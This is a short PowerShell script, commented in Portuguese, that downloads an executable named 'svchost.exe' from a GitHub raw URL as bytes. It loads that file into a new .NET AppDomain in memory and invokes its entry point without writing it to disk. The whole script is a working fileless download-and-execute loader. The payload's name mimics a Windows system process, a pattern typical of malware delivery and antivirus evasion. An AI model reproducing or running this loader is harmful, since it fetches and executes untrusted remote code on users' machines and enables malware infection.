# 1. URL para o seu .exe hospedado
$url = "https://github.com/bragaawy/pjl/raw/main/svchost.exe"

# 2. Baixa o .exe como um array de bytes
$webClient = New-Object System.Net.WebClient
$bytesDoExe = $webClient.DownloadData($url )

# --- TÉCNICA DE CARREGAMENTO CORRIGIDA ---

# 3. Cria um novo "mundo" (AppDomain) para nossa aplicação
$novoDominio = [System.AppDomain]::CreateDomain("DominioWPF")

# 4. Carrega o nosso .exe (a partir dos bytes) DENTRO do novo domínio
$assembly = $novoDominio.Load($bytesDoExe)

# 5. Encontra o ponto de entrada (o método Main) do nosso .exe
$entryPoint = $assembly.EntryPoint

# 6. Invoca o ponto de entrada.
#    O [STAThread] é crucial e é definido automaticamente para o EntryPoint de apps WPF.
$entryPoint.Invoke($null, $null)

# Opcional: Descarrega o AppDomain quando a janela fechar (limpeza)
# [System.AppDomain]::Unload($novoDominio)
